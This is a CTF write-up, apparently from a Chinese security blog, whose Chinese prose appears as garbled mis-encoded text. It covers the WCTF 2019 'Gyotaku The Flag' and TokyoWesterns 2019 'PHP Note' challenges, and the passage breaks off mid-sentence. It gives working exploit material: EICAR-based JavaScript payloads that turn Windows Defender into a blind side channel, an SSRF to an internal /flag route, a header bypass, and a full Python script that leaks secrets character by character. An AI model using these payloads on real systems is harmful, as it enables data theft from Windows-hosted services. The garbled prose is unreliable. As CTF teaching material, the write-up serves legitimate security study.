var mal = \u0026#34;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\u0026#34; + body[0]; eval(mal); \u0026lt;/script\u0026gt; \u0026lt;body\u0026gt;*\u0026lt;/body\u0026gt;  \nå¾ˆæ£’ï¼Œæ„æ–™ä¹‹ä¸­åœ°è§¦å‘äº† Windows Defenderã€‚\nGo Hacking é‚£è§¦å‘ Windows Defender ä¼šæœ‰ä»€ä¹ˆé—®é¢˜å—ï¼Ÿè™½ç„¶è¿™é‡Œçœ‹ä¼¼æ²¡ä»€ä¹ˆæ¯›ç—…ï¼Œä½†æ˜¯æ”¾åˆ°ä¸šåŠ¡ä»£ç é‡Œé¢å°±ä¸ä¸€æ ·äº†ã€‚\nä»”ç»†æƒ³æƒ³ä¸€èˆ¬ç¨‹åºçŒ¿ä¼šè¿™ä¹ˆå†™æ–‡ä»¶å‘¢ï¼Ÿç»†å¿ƒçš„ç¨‹åºçŒ¿åœ¨è¿›è¡Œå†™æ–‡ä»¶ä¹‹åè¦ check ä¸€éæ˜¯å¦å†™å…¥æˆåŠŸï¼Œç±»ä¼¼:\n$err = file_put_contents(\u0026#39;/tmp/file_name\u0026#39;, \u0026#39;something need to be saved\u0026#39;); if(!$err)\treturn Exception; file_put_contentsåœ¨å†™å…¥æˆåŠŸåè¿”å›å†™å…¥å¤šå°‘ä¸ªå­—èŠ‚ï¼Œå¤±è´¥çš„æ—¶å€™è¿”å›Falseï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå½“æˆ‘ä»¬å†™å…¥æ¶æ„æ•°æ®çš„æ—¶å€™ï¼Œå› ä¸º Windows Defender æ£€æŸ¥å‡ºæ¶æ„å†…å®¹ï¼Œç¦æ­¢äº†ç”¨æˆ·è¯»å–æƒé™æˆ–è€…åˆ é™¤äº†æ–‡ä»¶ï¼Œå¯¼è‡´æœåŠ¡å› ä¸ºæ£€æŸ¥å†™å…¥ä¸æˆåŠŸæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œå¯¹äºæˆ‘ä»¬æ¥è¯´å¯èƒ½ç›´æ¥è¿”å›é”™è¯¯çš„çŠ¶æ€ç ç±»ä¼¼ 500 ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸€ä¸‹ï¼Œå¤§è‡´æˆ‘ä»¬å¯ä»¥æœ‰è¿™ä¹ˆä¸€å¥—ä¾§ä¿¡é“æ”»å‡»çš„æ”»å‡»é“¾ï¼š\neval(\u0026quot;EICA\u0026quot;+input) -\u0026gt; ? detected -\u0026gt; input is 'R' not detected -\u0026gt; input is not 'R' å¦‚æœå†…å®¹ä¸­æœ‰\u0026lt;body\u0026gt;æ ‡ç­¾ï¼Œå¹¶ä¸”å¦‚æœæœ‰æ— æ³•é€šè¿‡æ­£å¸¸æ‰‹æ®µè¯»åˆ°çš„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç”¨è¿™ç§ç±»ä¼¼â€œç›²æ³¨â€çš„æ–¹å¼å»è·å–ç§˜å¯†æ•°æ®\nJavaScript can access the elements :) â—‹ if they have \u0026lt;body\u0026gt; tag â—‹ \u0026lt;script\u0026gt;document.body.innerHTML[0]\u0026lt;/script\u0026gt;\u0026lt;body\u0026gt;[secret]\u0026lt;/body\u0026gt; è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒTokyo Westerns æŒ‡å‡ºä½¿ç”¨ifè¯­å¥æ„é€ çš„ EICAR æ ·æœ¬ï¼ŒWindows Defender æ˜¯ä¸ä¼šæ£€æµ‹å‡ºæ¥çš„ï¼Œä¾‹å¦‚ä»¥ä¸‹ payload ï¼Œmalå·²ç»å¯ä»¥æ„é€ å‡º EICAR æ ·æœ¬ï¼Œä½†æ˜¯ä¸ä¼šè§¦å‘ Windows Denfender çš„ï¼Œä½†æ˜¯å¤§è‡´æ€è·¯æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ®µä»£ç æ¥ç†è§£\n\u0026lt;script\u0026gt; var n = \u0026#39;a\u0026#39;; if(document.body.innerHTML[0] \u0026gt; \u0026#39;a\u0026#39;) n = \u0026#39;*\u0026#39;; var mal = \u0026#34;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\u0026#34; + n; eval(mal); \u0026lt;/script\u0026gt; \u0026lt;body\u0026gt;flag{aaa}\u0026lt;/body\u0026gt; ç„¶åæˆ‘ä»¬å¤§è‡´ä¿®æ”¹ä¸€ä¸‹ï¼Œä¸ä½¿ç”¨ifä½œä¸ºåˆ¤æ–­é€‰æ‹©æ¡ä»¶ï¼Œä½¿ç”¨Math.min()ä½œä¸ºåˆ¤æ–­é€‰æ‹©ï¼Œæ‰€ä»¥å¤§è‡´æˆ‘ä»¬å¯ä»¥å¾—åˆ°è¿™ä¹ˆä¸ª payload :\n\u0026lt;script\u0026gt; var num = 90; var body = document.body.innerHTML[0].charCodeAt(0); var mal = \u0026#34;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\u0026#34; + {[num] : \u0026#39;*\u0026#39;}[Math.min(num ,body)]; eval(mal); \u0026lt;/script\u0026gt; \u0026lt;body\u0026gt;flag{aaa}\u0026lt;/body\u0026gt; å› ä¸ºbodyè·å–åˆ°çš„æ˜¯fçš„ ascii ç ä¸º 102 ï¼Œå¤§äº 90 ï¼Œæ‰€ä»¥Math.min()è¿”å›å€¼ä¸º 90 ï¼Œ{[num]:'*'}åˆ›å»ºäº†ä¸€ä¸ª key ä¸º 90 ï¼Œvalue ä¸º * çš„å¯¹è±¡ï¼Œè¿™é‡Œæ³¨æ„éœ€è¦ç”¨[num]æŠŠnumå½“ä½œå˜é‡ï¼Œå› ä¸ºå¦‚æœç›´æ¥ä½¿ç”¨{num:'*'}ï¼Œè¿™æ ·æ˜¯åˆ›å»ºäº†ä¸€ä¸ª key ä¸º num çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ value ä¸º * çš„å¯¹è±¡\n\u0026gt; var num = 90; undefined \u0026gt; var n = {num : \u0026#39;*\u0026#39;}; undefined \u0026gt; console.log([num]); [ 90 ] undefined \u0026gt; console.log(n[num]); undefined undefined \u0026gt; console.log(n[\u0026#39;num\u0026#39;]); * undefined \u0026gt; console.log(n); { num: \u0026#39;*\u0026#39; }  \nè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡â€œç›²æ³¨â€çš„æ–¹å¼è·å–\u0026lt;body\u0026gt;æ ‡ç­¾ä¸­çš„ç§˜å¯†æ•°æ®äº†ã€‚\nGyotaku The Flag é¢˜ç›®æºç åœ¨ Gyotaku The Flagï¼Œslides åœ¨ WCTF2019: Gyotaku The Flag\næœ‰äº†ä»¥ä¸Šçš„çŸ¥è¯†ï¼Œè®©æˆ‘ä»¬å›åˆ° WCTF 2019 Gyotaku The Flag è¿™é“é¢˜ä¸Šï¼Œè¿™é“é¢˜æœ‰è¿™ä¹ˆå‡ ä¸ªè·¯ç”±\ne.GET(\u0026#34;/\u0026#34;, IndexHandler(dbconn), LoginRequiredMiddleware) e.GET(\u0026#34;/gyotaku\u0026#34;, GyotakuListHandler(dbconn), LoginRequiredMiddleware) e.GET(\u0026#34;/gyotaku/:gid\u0026#34;, GyotakuViewHandler(dbconn), LoginRequiredMiddleware) e.GET(\u0026#34;/flag\u0026#34;, FlagHandler, InternalRequiredMiddleware) e.POST(\u0026#34;/login\u0026#34;, LoginHandler(dbconn)) e.POST(\u0026#34;/gyotaku\u0026#34;, GyotakuHandler(dbconn), LoginRequiredMiddleware) So easy to GetFlag åœ¨/flagçš„è·¯ç”±ä¸Šæœ‰ä¸€ä¸ªç±»ä¼¼äºä¸­é—´ä»¶çš„åŠŸèƒ½ï¼šInternalRequiredMiddleware\nfunc InternalRequiredMiddleware(next echo.HandlerFunc) echo.HandlerFunc { return func(c echo.Context) error { ip := net.ParseIP(c.RealIP()) localip := net.ParseIP(\u0026#34;127.0.0.1\u0026#34;) if !ip.Equal(localip) { return echo.NewHTTPError(http.StatusForbidden) } return next(c) } } ä»¥åŠ FlagHandler:\nfunc FlagHandler(c echo.Context) error { data, err := ioutil.ReadFile(\u0026#34;flag\u0026#34;) if err != nil { return err } return c.String(http.StatusOK, string(data)) } å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªæ§åˆ¶åªèƒ½127.0.0.1è®¿é—®çš„åŠŸèƒ½å‡½æ•°ï¼Œç”¨äºæ„é€ é¢˜ç›®çš„ SSRF è¿™ä¹ˆä¸€ä¸ªç±»ä¼¼çš„å…³å¡ï¼Œå¯æ˜¯ç”±äºå‡ºé¢˜äººä¸æ˜¯ç‰¹åˆ«ç»†å¿ƒï¼Œecho.Context.RealIPå¯ä»¥è¢«X-Real-IPç»•è¿‡ï¼Œæ‰€ä»¥å¯¼è‡´äº†å½“æ—¶å¾ˆå¤šäººç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹å¼æ‹¿åˆ°äº† flag \u0026hellip;\né¢˜ç›®ç»“æŸï¼Œåˆ†æå®Œäº†ï¼Œå…³äº†å§åˆ«çœ‹äº†ï¼Œåé¢éƒ½æ˜¯æ‰¯æ·¡ï¼Œæ‹¿åˆ° flag å°±æ˜¯ç‹é“ï¼Œç®¡ä»–ç”¨ä»€ä¹ˆæ–¹å¼\nThe better way to GetFlag å¥½äº†ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥åˆ†æåˆ†ææ¯”è¾ƒæœ‰æ„æ€çš„é¢„æœŸè§£ã€‚\n/loginè·¯ç”±æ¯”è¾ƒç®€å•ï¼Œä½¿ç”¨çš„æ˜¯goleveldbåšçš„æ•°æ®æ“ä½œ\n/gyotakuè·¯ç”± GET æ–¹æ³•åˆ—ä¸¾ç”¨æˆ·æœ‰å¤šå°‘é‡‘å·åƒ\n/gyotaku/:gidä»æ–‡ä»¶ä¸­æŸ¥æ‰¾gid\næˆ‘ä»¬å¯ä»¥åœ¨/gyotakuè·¯ç”±çš„ POST æ–¹æ³•ä¸­çœ‹åˆ°æ¥æ”¶äº†ä¸€ä¸ª url å‚æ•°ï¼Œå¹¶å¯¹ url è¿›è¡Œäº†è¯·æ±‚ï¼š\nurl := c.FormValue(\u0026#34;url\u0026#34;) ... resp, err := http.Get(url) è¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ SSRF çš„ç‚¹äº†ï¼Œä¼ å…¥ url è®©æœåŠ¡å™¨è¯·æ±‚è¿™ä¸ª URL ã€‚\nç„¶åæˆ‘ä»¬å¯ä»¥æ¥ç€å¾€ä¸‹çœ‹ï¼Œæ³¨æ„åˆ°æœ‰ä¸ªå†™æ–‡ä»¶çš„æ“ä½œï¼š\nresp, err := http.Get(url) if err != nil { return err } defer resp.Body.Close() body, err := ioutil.ReadAll(resp.Body) if err != nil { return err } // save gyotaku gyotakudata := \u0026amp;GyotakuData{ URL: url, Data: string(body), UserName: username, } buf := bytes.NewBuffer(nil) err = gob.NewEncoder(buf).Encode(gyotakudata) if err != nil { return err } err = ioutil.WriteFile(path.Join(GyotakuDir, gid), buf.Bytes(), 0644) if err != nil { return err } è¿™æ®µå°†GyotakuDataå†™å…¥äº†ä¸€ä¸ªæ–‡ä»¶å½“ä¸­ï¼Œå¹¶ä¸”è·Ÿæˆ‘ä»¬ä¸Šæ–‡æåˆ°çš„å†™æ–‡ä»¶æ–¹æ³•ä¸€è‡´ï¼Œåˆ¤æ–­äº†æ˜¯å¦å†™å…¥æˆåŠŸï¼Œä¸æˆåŠŸå°±è¿”å›errï¼Œå¹¶ä¸”åœ¨è¿™é‡Œä¸‰ä¸ªå†™å…¥çš„å‚æ•°æˆ‘ä»¬éƒ½å¯æ§ã€‚\næ‰€ä»¥æˆ‘ä»¬ç°åœ¨å¯ä»¥æœ‰ä¸€ä¸ªå¤§è‡´æ€è·¯ï¼Œé€šè¿‡æäº¤{\u0026quot;url\u0026quot;:\u0026quot;http://127.0.0.1/flag\u0026quot;}åˆ°/gyotakuè·¯ç”±ï¼Œæ„æˆä¸€ä¸ª SSRF ï¼Œè¿™æ—¶å€™/flagè·¯ç”±ä¼šè¿”å› flag ï¼Œé€šè¿‡ä»¥ä¸Šä»£ç è§£æï¼Œflag è¢«æ”¾åˆ°äº†Dataä¸­ï¼Œæ¥ç€æˆ‘ä»¬å†çœ‹ä¸€ä¸‹GyotakuDataç»“æ„ä½“\ntype GyotakuData struct { URL string `json:\u0026#34;url\u0026#34;` Data string `json:\u0026#34;data\u0026#34;` UserName string `json:\u0026#34;username\u0026#34;` } å¦‚æœä¸­é—´æ˜¯Dataæ˜¯æˆ‘ä»¬\u0026lt;body\u0026gt;æ ‡ç­¾çš„ secret æ•°æ®ï¼Œé‚£ä¹ˆUserNameæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ª\u0026lt;/body\u0026gt;æ ‡ç­¾å°†å…¶é—­åˆï¼Œå‰é¢ URL æ€ä¹ˆæ„é€ å¥½å‘¢ï¼Ÿ\nå› ä¸º/flagè·¯ç”±æ˜¯ä¸å¤„ç†ä»»ä½• GET å‚æ•°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•æŠŠæˆ‘ä»¬éœ€è¦æ„é€ çš„ payload æ”¾åˆ° URL å‚æ•°å½“ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥æ„é€ äº†æˆ‘ä»¬ä¸Šæ–‡çš„ Payload äº†ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ çš„å¤§è‡´å°±æ˜¯ä»¥ä¸‹è¿™æ ·ï¼š\ntype GyotakuData struct { URL string \u0026#34;http://127.0.0.1/flag?\u0026lt;script\u0026gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = \u0026#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\u0026#39; + {[num] : \u0026#39;*\u0026#39;}[Math.min(num ,body)];eval(mal);\u0026lt;/script\u0026gt;\u0026lt;body\u0026gt;\u0026#34; Data string \u0026#34;flag{test}\u0026#34; UserName string \u0026#34;\u0026lt;/body\u0026gt;\u0026#34; } è¿™æ ·æœåŠ¡æŠŠGyotakuDataç»“æ„ä½“å†™å…¥æ–‡ä»¶å½“ä¸­äº†:\n...GyotakuData...URL...Data...UserName...http://127.0.0.1/flag?\u0026lt;script\u0026gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H' + {[num] : '*'}[Math.min(num ,body)];eval(mal);\u0026lt;/script\u0026gt;\u0026lt;body\u0026gt;... flag{test}...\u0026lt;/body\u0026gt;... ä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œä¸Šé¢æˆ‘ç”¨...ä»£æ›¿äº†ä¸å¯è§å­—ç¬¦ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æµ‹è¯•ä»£ç è¿›è¡Œæµ‹è¯•ï¼š\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;encoding/gob\u0026#34; \u0026#34;io/ioutil\u0026#34; ) type GyotakuData struct { URL string `json:\u0026#34;url\u0026#34;` Data string `json:\u0026#34;data\u0026#34;` UserName string `json:\u0026#34;username\u0026#34;` } func main() { url := \u0026#34;http://127.0.0.1/flag?\u0026lt;script\u0026gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = \u0026#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H\u0026#39; + {[num] : \u0026#39;*\u0026#39;}[Math.min(num ,body)];eval(mal);\u0026lt;/script\u0026gt;\u0026lt;body\u0026gt;\u0026#34; body := \u0026#34;flag{test}\u0026#34; username := \u0026#34;\u0026lt;/body\u0026gt;\u0026#34; gyotakudata := \u0026amp;GyotakuData{ URL: url, Data: body, UserName: username, } buf := bytes.NewBuffer(nil) gob.NewEncoder(buf).Encode(gyotakudata) ioutil.WriteFile(\u0026#34;test.txt\u0026#34;, buf.Bytes(), 0644) } è¿™æ ·åªè¦æˆ‘ä»¬æ¯æ¬¡æ§åˆ¶ num çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æœåŠ¡å™¨ 500 çš„æ—¶å€™åˆ¤æ–­æˆ‘ä»¬è®¾ç«‹çš„æ¡ä»¶æ˜¯å¦æˆç«‹äº†ã€‚è¿™é‡Œç›´æ¥ç»™å‡º TokyoWesterns çš„ exp è„šæœ¬ï¼Œä»–ä»¬ä½¿ç”¨äº†äºŒåˆ†æ³•åŠ å¿«åˆ¤æ–­ï¼š\nimport requests URL = \u0026#34;http://192.168.122.78\u0026#34; # changeme def randstr(n=8): import random import string chars = string.ascii_uppercase + string.ascii_lowercase + string.digits return \u0026#39;\u0026#39;.join([random.choice(chars) for _ in range(n)]) def trigger(c, idx, sess): import string prefix = randstr() p = prefix + \u0026#39;\u0026#39;\u0026#39;\u0026lt;script\u0026gt;f=function(n){eval(\u0026#39;X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H\u0026#39;+{${c}:\u0026#39;*\u0026#39;}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));\u0026lt;/script\u0026gt;\u0026lt;body\u0026gt;\u0026#39;\u0026#39;\u0026#39; p = string.Template(p).substitute({\u0026#39;idx\u0026#39;: idx, \u0026#39;c\u0026#39;: c}) req = sess.post(URL + \u0026#39;/gyotaku\u0026#39;, data={\u0026#39;url\u0026#39;: \u0026#39;http://127.0.0.1/flag?a=\u0026#39; + p}) return req.json() def leak(idx, sess): l, h = 0, 0x100 while h - l \u0026gt; 1: m = (h + l) // 2 gid = trigger(m, idx, sess) if sess.get(URL + \u0026#39;/gyotaku/\u0026#39; + gid).status_code == 500: l = m else: h = m return chr(l) sess = requests.session() sess.post(URL + \u0026#39;/login\u0026#39;, data={\u0026#39;username\u0026#39;: \u0026#39;\u0026lt;/body\u0026gt;\u0026#39;+randstr(), \u0026#39;password\u0026#39;: randstr()}) data = \u0026#39;\u0026#39; for i in range(30): data += leak(i, sess) print(data) è¿™é‡Œtriggerå‡½æ•°ä¸­ idx å°±æ˜¯è·å–çš„\u0026lt;body\u0026gt;æ ‡ç­¾ä¸­çš„ç¬¬å‡ ä½ï¼Œc å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ç”¨äºæ¯”è¾ƒçš„ ascii ç å€¼ã€‚è‡³æ­¤ï¼Œè¿™é¢˜å°±åˆ†æå®Œæ¯•äº†ã€‚\nPHP Note åœ¨ TokyoWesterns CTF 2019 ä¸Šï¼Œç”±äº WCTF 2019 ä¸Šçš„å¤±è¯¯ï¼Œè®©ä»–ä»¬åˆå‡ºäº†ä¸€é“ä¸ä¹‹ç›¸å…³çš„é¢˜ç›®ã€‚\n\u0026lt;?php include \u0026#39;config.php\u0026#39;; class Note { public function __construct($admin) { $this-\u0026gt;notes = array(); $this-\u0026gt;isadmin = $admin; } public function addnote($title, $body) { array_push($this-\u0026gt;notes, [$title, $body]); } public function getnotes() { return $this-\u0026gt;notes; } public function getflag() { if ($this-\u0026gt;isadmin === true) { echo FLAG; } } } function verify($data, $hmac) { $secret = $_SESSION[\u0026#39;secret\u0026#39;]; if (empty($secret)) return false; return hash_equals(hash_hmac(\u0026#39;sha256\u0026#39;, $data, $secret), $hmac); } function hmac($data) { $secret = $_SESSION[\u0026#39;secret\u0026#39;]; if (empty($data) || empty($secret)) return false; return hash_hmac(\u0026#39;sha256\u0026#39;, $data, $secret); } function gen_secret($seed) { return md5(SALT . $seed . PEPPER); } function is_login() { return !empty($_SESSION[\u0026#39;secret\u0026#39;]); } function redirect($action) { header(\u0026#34;Location: /?action=$action\u0026#34;); exit(); } $method = $_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;]; $action = $_GET[\u0026#39;action\u0026#39;]; if (!in_array($action, [\u0026#39;index\u0026#39;, \u0026#39;login\u0026#39;, \u0026#39;logout\u0026#39;, \u0026#39;post\u0026#39;, \u0026#39;source\u0026#39;, \u0026#39;getflag\u0026#39;])) { redirect(\u0026#39;index\u0026#39;); } if ($action === \u0026#39;source\u0026#39;) { highlight_file(__FILE__); exit(); } session_start(); if (is_login()) { $realname = $_SESSION[\u0026#39;realname\u0026#39;]; $nickname = $_SESSION[\u0026#39;nickname\u0026#39;]; $note = verify($_COOKIE[\u0026#39;note\u0026#39;], $_COOKIE[\u0026#39;hmac\u0026#39;]) ? unserialize(base64_decode($_COOKIE[\u0026#39;note\u0026#39;])) : new Note(false); } if ($action === \u0026#39;login\u0026#39;) { if ($method === \u0026#39;POST\u0026#39;) { $nickname = (string)$_POST[\u0026#39;nickname\u0026#39;]; $realname = (string)$_POST[\u0026#39;realname\u0026#39;]; if (empty($realname) || strlen($realname) \u0026lt; 8) { die(\u0026#39;invalid name\u0026#39;); } $_SESSION[\u0026#39;realname\u0026#39;] = $realname; if (!empty($nickname)) { $_SESSION[\u0026#39;nickname\u0026#39;] = $nickname; } $_SESSION[\u0026#39;secret\u0026#39;] = gen_secret($nickname); } redirect(\u0026#39;index\u0026#39;); } if ($action === \u0026#39;logout\u0026#39;) { session_destroy(); redirect(\u0026#39;index\u0026#39;); } if ($action === \u0026#39;post\u0026#39;) { if ($method === \u0026#39;POST\u0026#39;) { $title = (string)$_POST[\u0026#39;title\u0026#39;]; $body = (string)$_POST[\u0026#39;body\u0026#39;]; $note-\u0026gt;addnote($title, $body); $data = base64_encode(serialize($note)); setcookie(\u0026#39;note\u0026#39;, (string)$data); setcookie(\u0026#39;hmac\u0026#39;, (string)hmac($data)); } redirect(\u0026#39;index\u0026#39;); } if ($action === \u0026#39;getflag\u0026#39;) { $note-\u0026gt;getflag(); } ?\u0026gt;\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;PHP note\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;style\u0026gt; textarea { resize: none; width: 300px; height: 200px; } \u0026lt;/style\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php if (!is_login()) { $realname = htmlspecialchars($realname); $nickname = htmlspecialchars($nickname); ?\u0026gt; \u0026lt;form action=\u0026#34;/?action=login\u0026#34; method=\u0026#34;post\u0026#34; id=\u0026#34;login\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;firstname\u0026#34; placeholder=\u0026#34;First Name\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;lastname\u0026#34; placeholder=\u0026#34;Last Name\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;nickname\u0026#34; id=\u0026#34;nickname\u0026#34; placeholder=\u0026#34;nickname\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;realname\u0026#34; id=\u0026#34;realname\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Login\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } else { ?\u0026gt; \u0026lt;h1\u0026gt;Welcome, \u0026lt;?=$realname?\u0026gt;\u0026lt;?= !empty($nickname) ? \u0026#34; ($nickname)\u0026#34; : \u0026#34;\u0026#34; ?\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;a href=\u0026#34;/?action=logout\u0026#34;\u0026gt;logout\u0026lt;/a\u0026gt; \u0026lt;!-- \u0026lt;a href=\u0026#34;/?action=source\u0026#34;\u0026gt;source\u0026lt;/a\u0026gt; --\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;?php foreach($note-\u0026gt;getnotes() as $k =\u0026gt; $v) { list($title, $body) = $v; $title = htmlspecialchars($title); $body = htmlspecialchars($body); ?\u0026gt; \u0026lt;h2\u0026gt;\u0026lt;?=$title?\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;\u0026lt;?=$body?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;form action=\u0026#34;/?action=post\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34; placeholder=\u0026#34;title\u0026#34;\u0026gt; \u0026lt;br\u0026gt; \u0026lt;textarea name=\u0026#34;body\u0026#34; placeholder=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Post\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;?php ?\u0026gt; \u0026lt;script\u0026gt; document.querySelector(\u0026#34;form#login\u0026#34;).addEventListener(\u0026#39;submit\u0026#39;, (e) =\u0026gt; { const nickname = document.querySelector(\u0026#34;input#nickname\u0026#34;) const firstname = document.querySelector(\u0026#34;input#firstname\u0026#34;) const lastname = document.querySelector(\u0026#34;input#lastname\u0026#34;) document.querySelector(\u0026#34;input#realname\u0026#34;).value = `${firstname.value} ${lastname.value}` if (nickname.value.length == 0 \u0026amp;\u0026amp; firstname.value.length \u0026gt; 0 \u0026amp;\u0026amp; lastname.value.length \u0026gt; 0) { nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase() } }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ä¹ä¸€çœ‹ç¡®å®æ²¡æœ‰ä»»ä½•çš„æ¼æ´ç‚¹ï¼Œè®©äººæ¯”è¾ƒåœ¨æ„çš„åªæœ‰unserializeå‡½æ•°ï¼Œæˆ‘ä»¬å…³æ³¨çš„æ˜¯getflag()ï¼Œæ¡ä»¶æ˜¯æˆä¸ºç®¡ç†å‘˜ï¼Œè€Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä»¥ä¸‹æ¡ä»¶ï¼š\nfunction verify($data, $hmac) { $secret = $_SESSION[\u0026#39;secret\u0026#39;]; if (empty($secret)) return false; return hash_equals(hash_hmac(\u0026#39;sha256\u0026#39;, $data, $secret), $hmac); } ... $note = verify($_COOKIE[\u0026#39;note\u0026#39;], $_COOKIE[\u0026#39;hmac\u0026#39;]) ? unserialize(base64_decode($_COOKIE[\u0026#39;note\u0026#39;])) : new Note(false); å¦‚æœæ²¡æœ‰é€šè¿‡verifyå‡½æ•°åˆ¤æ–­ï¼ŒNoteçš„æ„é€ å‡½æ•°ä¼šè®¾ç½®$this-\u0026gt;isadmin = False;ï¼Œä½†æ˜¯$_SESSION['secret']åˆç”±gen_secretå‡½æ•°ç”Ÿæˆï¼ŒSALTå’ŒPEPPERæˆ‘ä»¬éƒ½ä¸çŸ¥é“ï¼Œç”¨ä¸€èˆ¬çš„æ–¹æ³•æ‹¿åˆ° secret åŸºæœ¬ä¸å¯èƒ½ã€‚\nfunction gen_secret($seed) { return md5(SALT . $seed . PEPPER); } ... if ($action === \u0026#39;login\u0026#39;) { if ($method === \u0026#39;POST\u0026#39;) { $nickname = (string)$_POST[\u0026#39;nickname\u0026#39;]; $realname = (string)$_POST[\u0026#39;realname\u0026#39;]; if (empty($realname) || strlen($realname) \u0026lt; 8) { die(\u0026#39;invalid name\u0026#39;); } $_SESSION[\u0026#39;realname\u0026#39;] = $realname; if (!empty($nickname)) { $_SESSION[\u0026#39;nickname\u0026#39;] = $nickname; } $_SESSION[\u0026#39;secret\u0026#39;] = gen_secret($nickname); } redirect(\u0026#39;index\u0026#39;); } è€Œhash_equalsä¹Ÿæ²¡æœ‰ä»€ä¹ˆç»•è¿‡çš„åŠæ³•ï¼Œæ‰€ä»¥è¿™é‡Œçœ‹èµ·æ¥ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæ­£å¸¸çš„åŠæ³•ã€‚\nå¤§è‡´æˆ‘ä»¬å¯ä»¥çŸ¥é“è¦è·å– Flag ï¼Œå°±è¦æˆä¸º admin ï¼Œè¦æˆä¸º admin å°±è¦çŸ¥é“ $_SESSION['secret']ã€‚\né¢˜ç›®çš„å¤§è‡´åŠŸèƒ½ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåªæœ‰ç™»å½•æ³¨é”€ã€å¢åŠ  post åŠŸèƒ½ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä»ç›¸åº”å¤´å‘ç°ä¸€äº›è››ä¸é©¬è¿¹ï¼š\nServer: Microsoft-IIS/10.0 X-Powered-By: PHP/7.3.9 ä¹‹åæˆ‘ä»¬å°±å¯ä»¥ä»è¿™é‡Œå¤§æ¦‚çŒœåˆ°å…¶å®ä¸ä¸Šé¢˜ä¸€è‡´ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿ\n $_SESSION['secret']å­˜æ”¾åœ¨ Session æ–‡ä»¶å½“ä¸­ Session æ–‡ä»¶åˆå­˜æ”¾åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­ å¦‚æœ Session æ–‡ä»¶å«æœ‰æ¶æ„å†…å®¹å°±ä¼šè¢« Windows Defender é˜»æ­¢è®¿é—®é€ æˆç™»å½•å¤±è´¥ è¿™æ 